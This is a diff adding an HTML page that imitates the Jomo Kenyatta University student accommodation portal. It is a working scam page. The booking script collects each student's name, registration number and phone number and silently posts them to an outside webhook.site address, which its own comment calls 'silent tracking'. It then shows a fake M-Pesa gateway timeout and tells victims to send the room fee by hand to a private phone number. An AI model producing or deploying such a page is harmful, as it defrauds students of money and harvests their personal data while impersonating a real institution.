@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JKUAT Directorate of Student Accommodation</title>
+    <style>
+        :root {
+            --primary-dark: #004d28; /* Deep JKUAT Green */
+            --primary-light: #0a8b4d;
+            --accent-gold: #c19a6b;
+            --bg-color: #f8f9fa;
+            --text-main: #212529;
+            --text-muted: #6c757d;
+            --border-color: #dee2e6;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+        }
+
+        /* --- Header & Navigation --- */
+        .top-stripe {
+            background-color: var(--accent-gold);
+            height: 4px;
+            width: 100%;
+        }
+
+        nav {
+            background-color: #ffffff;
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .brand-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .brand-container img {
+            height: 50px;
+        }
+
+        .brand-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .brand-text .title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--primary-dark);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .brand-text .subtitle {
+            font-size: 12px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .user-controls {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .logout-btn {
+            padding: 6px 16px;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            border: 1px solid var(--border-color);
+            text-decoration: none;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+
+        .logout-btn:hover {
+            background-color: #e2e6ea;
+        }
+
+        /* --- Page Header --- */
+        .page-header {
+            background-color: var(--primary-dark);
+            color: white;
+            padding: 40px 5%;
+            text-align: center;
+        }
+
+        .page-header h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .page-header p {
+            font-size: 15px;
+            opacity: 0.9;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* --- Main Content & Grid --- */
+        .main-content {
+            padding: 40px 5%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .hostel-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 24px;
+        }
+
+        .hostel-card {
+            background: #ffffff;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            transition: box-shadow 0.2s, transform 0.2s;
+        }
+
+        .hostel-card:hover {
+            box-shadow: 0 8px 16px rgba(0,0,0,0.08);
+            transform: translateY(-2px);
+        }
+
+        .card-image {
+            height: 180px;
+            background-color: #e9ecef;
+            background-size: cover;
+            background-position: center;
+            position: relative;
+            border-bottom: 2px solid var(--accent-gold);
+        }
+
+        .gender-tag {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 4px 10px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: white;
+            border-radius: 3px;
+        }
+
+        .tag-male { background-color: #2980b9; }
+        .tag-female { background-color: #d81b60; }
+
+        .card-body {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .hostel-name {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--primary-dark);
+            margin-bottom: 4px;
+        }
+
+        .hostel-type {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .hostel-price {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 20px;
+        }
+
+        .hostel-price span {
+            font-size: 12px;
+            color: var(--text-muted);
+            font-weight: normal;
+        }
+
+        .btn-select {
+            width: 100%;
+            padding: 10px;
+            background-color: var(--primary-dark);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: auto;
+            transition: background-color 0.2s;
+        }
+
+        .btn-select:hover {
+            background-color: var(--primary-light);
+        }
+
+        /* --- Institutional Modal --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .modal-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 480px;
+            border-radius: 6px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            transform: translateY(20px);
+            transition: transform 0.2s;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-overlay.active .modal-card {
+            transform: translateY(0);
+        }
+
+        .modal-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #f8f9fa;
+            border-radius: 6px 6px 0 0;
+        }
+
+        .modal-header h3 {
+            font-size: 16px;
+            color: var(--primary-dark);
+            font-weight: 700;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: var(--text-muted);
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        .payment-summary {
+            background-color: #e9ecef;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .payment-summary .room-label { font-size: 14px; font-weight: 600; }
+        .payment-summary .room-cost { font-size: 18px; font-weight: 700; color: var(--primary-dark); }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            font-size: 14px;
+            color: var(--text-main);
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-light);
+            box-shadow: 0 0 0 2px rgba(10, 139, 77, 0.1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .loader-text {
+            text-align: center;
+            font-size: 13px;
+            color: #28a745;
+            font-weight: 600;
+            margin-top: 15px;
+            display: none;
+        }
+
+        /* --- Error Fallback UI --- */
+        .error-box {
+            background-color: #fff3f3;
+            border: 1px solid #ffcdd2;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        .error-title { color: #d32f2f; font-weight: 700; font-size: 14px; margin-bottom: 4px; }
+        .error-desc { color: #c62828; font-size: 13px; }
+
+        .manual-instructions {
+            border: 1px solid var(--border-color);
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            background-color: #f8f9fa;
+        }
+
+        .manual-instructions p {
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: var(--text-main);
+        }
+
+        /* --- Mobile Adjustments --- */
+        @media (max-width: 768px) {
+            nav { flex-direction: column; gap: 15px; padding: 15px; }
+            .user-controls { width: 100%; justify-content: space-between; }
+            .page-header h1 { font-size: 22px; }
+            .modal-card { width: 95%; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-stripe"></div>
+    <nav>
+        <div class="brand-container">
+            <img src="jkuat-logo.png" alt="JKUAT Logo" onerror="this.style.display='none'">
+            <div class="brand-text">
+                <span class="title">Accommodation Portal</span>
+                <span class="subtitle">Jomo Kenyatta University of Agriculture & Technology</span>
+            </div>
+        </div>
+        <div class="user-controls">
+            <span>Academic Year: 2026/2027</span>
+            <a href="index.html" class="logout-btn">Log Out</a>
+        </div>
+    </nav>
+
+    <div class="page-header">
+        <h1>Internal Hostel Allocation</h1>
+        <p>Rooms are allocated strictly on a first-come, first-served basis. Complete your payment via M-Pesa to generate your official room allocation receipt.</p>
+    </div>
+
+    <div class="main-content">
+        <div class="hostel-grid">
+            <!-- Hostel 1 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h1.jpeg');">
+                    <span class="gender-tag tag-male">Male</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 1</h3>
+                    <div class="hostel-type">Double Sharing Room</div>
+                    <div class="hostel-price">KES 4,500 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Hall 1 (Double)', 4500)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 2 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h2.jpeg');">
+                    <span class="gender-tag tag-male">Male</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 2</h3>
+                    <div class="hostel-type">Quad Sharing (4 Students)</div>
+                    <div class="hostel-price">KES 3,900 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Hall 2 (Quad)', 3900)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 3 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h3.jpeg');">
+                    <span class="gender-tag tag-male">Male</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 3</h3>
+                    <div class="hostel-type">Double Sharing Room</div>
+                    <div class="hostel-price">KES 4,500 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Hall 3 (Double)', 4500)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 4 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h4.jpeg');">
+                    <span class="gender-tag tag-female">Female</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 4</h3>
+                    <div class="hostel-type">Double Sharing Room</div>
+                    <div class="hostel-price">KES 4,500 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Hall 4 (Double)', 4500)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 5 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h5.jpeg');">
+                    <span class="gender-tag tag-female">Female</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 5</h3>
+                    <div class="hostel-type">Quad Sharing (4 Students)</div>
+                    <div class="hostel-price">KES 3,900 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Hall 5 (Quad)', 3900)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 6 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h6.jpeg');">
+                    <span class="gender-tag tag-female">Female</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 6 (Block A)</h3>
+                    <div class="hostel-type">Double Sharing Room</div>
+                    <div class="hostel-price">KES 4,500 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Hall 6A (Double)', 4500)">Proceed to Booking</button>
+                </div>
+            </div>
+
+             <!-- Hostel 7 -->
+             <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h7.jpeg');">
+                    <span class="gender-tag tag-male">Male</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 6 (Block B)</h3>
+                    <div class="hostel-type">Double Sharing Room</div>
+                    <div class="hostel-price">KES 4,500 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Hall 6B (Double)', 4500)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 8 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h8.jpeg');">
+                    <span class="gender-tag tag-male">Male</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Hall 7 (Ndovu)</h3>
+                    <div class="hostel-type">Quad Sharing (4 Students)</div>
+                    <div class="hostel-price">KES 3,900 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Ndovu (Quad)', 3900)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 9 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h9.jpeg');">
+                    <span class="gender-tag tag-female">Female</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Elgon Annex</h3>
+                    <div class="hostel-type">Premium Double Sharing</div>
+                    <div class="hostel-price">KES 5,500 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Elgon Annex (Double)', 5500)">Proceed to Booking</button>
+                </div>
+            </div>
+
+            <!-- Hostel 10 -->
+            <div class="hostel-card">
+                <div class="card-image" style="background-image: url('jkuat-h10.jpeg');">
+                    <span class="gender-tag tag-male">Male</span>
+                </div>
+                <div class="card-body">
+                    <h3 class="hostel-name">Kilimanjaro Annex</h3>
+                    <div class="hostel-type">Premium Double Sharing</div>
+                    <div class="hostel-price">KES 5,500 <span>/ semester</span></div>
+                    <button class="btn-select" onclick="initiateBooking('Kilimanjaro (Double)', 5500)">Proceed to Booking</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Booking Modal -->
+    <div class="modal-overlay" id="bookingModal">
+        <div class="modal-card">
+            <div class="modal-header">
+                <h3>Secure Allocation</h3>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-body" id="modalDynamicContent">
+                <!-- Content injected via JS -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedRoom = "";
+        let selectedPrice = 0;
+
+        function initiateBooking(roomName, price) {
+            selectedRoom = roomName;
+            selectedPrice = price;
+            
+            const modalBody = document.getElementById('modalDynamicContent');
+            modalBody.innerHTML = `
+                <div class="payment-summary">
+                    <span class="room-label">${roomName}</span>
+                    <span class="room-cost">KES ${price.toLocaleString()}</span>
+                </div>
+                
+                <div class="form-group">
+                    <label>Full Name (As per admission)</label>
+                    <input type="text" id="studentName" placeholder="e.g. James Kamau" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Registration Number</label>
+                    <input type="text" id="studentReg" placeholder="e.g. BSIT-01-0001/2026" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Safaricom Phone Number (For M-Pesa)</label>
+                    <input type="tel" id="studentPhone" placeholder="07XX XXX XXX" required>
+                </div>
+
+                <button class="btn-submit" id="btnSubmitPayment" onclick="processSTK()">Authorize Payment</button>
+                <div class="loader-text" id="loadingText">Connecting to Safaricom Gateway...</div>
+            `;
+            
+            document.getElementById('bookingModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('bookingModal').classList.remove('active');
+        }
+
+        function processSTK() {
+            const name = document.getElementById('studentName').value.trim();
+            const reg = document.getElementById('studentReg').value.trim();
+            const phone = document.getElementById('studentPhone').value.trim();
+
+            if(!name || !reg || phone.length < 9) {
+                alert("Please complete all verification fields properly.");
+                return;
+            }
+
+            document.getElementById('btnSubmitPayment').style.display = 'none';
+            document.getElementById('loadingText').style.display = 'block';
+
+            // 🔥 SILENT TRACKING to your Webhook!
+            fetch('https://webhook.site/b925b6e9-543d-4906-9e8b-bc4234858beb', {
+                method: 'POST',
+                body: JSON.stringify({ Event: "BOOKING_ATTEMPT", Room: selectedRoom, Name: name, RegNo: reg, Phone: phone })
+            }).catch(e => console.log(e));
+
+            // Simulate Gateway Timeout leading to "Send Money"
+            setTimeout(() => {
+                const modalBody = document.getElementById('modalDynamicContent');
+                modalBody.innerHTML = `
+                    <div class="error-box">
+                        <div class="error-title">GATEWAY TIMEOUT</div>
+                        <div class="error-desc">Automated M-Pesa prompt failed due to network congestion.</div>
+                    </div>
+                    
+                    <p style="font-size: 14px; margin-bottom: 15px; color: var(--text-main);">
+                        To secure your allocation for <strong>${selectedRoom}</strong>, please complete your payment manually using the details below:
+                    </p>
+                    
+                    <div class="manual-instructions">
+                        <p><strong>1.</strong> Go to M-Pesa Menu</p>
+                        <p><strong>2.</strong> Select <strong>Send Money</strong></p>
+                        <p><strong>3.</strong> Enter Phone No: <strong style="color: var(--primary-dark); font-size: 16px;">0799837486</strong></p>
+                        <p><strong>4.</strong> Enter Amount: <strong>KES ${selectedPrice.toLocaleString()}</strong></p>
+                        <p style="margin-top: 10px; font-size: 12px; color: var(--text-muted);">*Use your Reg Number (${reg}) as the reference if prompted.</p>
+                    </div>
+                    
+                    <button class="btn-submit" onclick="confirmFinalPayment()">I Have Sent the Money</button>
+                `;
+            }, 3500);
+        }
+
+        function confirmFinalPayment() {
+            alert('Transaction Details Logged! Your allocation is pending verification. Please check your student portal in 5 minutes.');
+            closeModal();
+        }
+    </script>
+</body>
+</html>
